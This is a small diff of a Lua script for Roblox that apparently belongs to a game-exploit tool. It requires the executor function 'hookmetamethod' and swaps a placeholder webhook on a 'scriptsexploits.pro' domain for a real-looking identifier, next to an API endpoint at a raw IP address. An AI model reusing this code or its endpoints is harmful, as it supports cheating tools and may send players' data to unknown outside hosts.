@@ -5,7 +5,7 @@ local Players = game:GetService("Players")
 print("version: 0.0.7")
 
 local API_URL = "http://31.97.106.155:6767/error"
-local WEBHOOK_URL = "https://webhooks.scriptsexploits.pro/api/v2/XXXX"
+local WEBHOOK_URL = "https://webhooks.scriptsexploits.pro/api/v2/82077b860d073b02"
 
 local REQUIRED_FUNCTIONS = {
     "hookmetamethod",
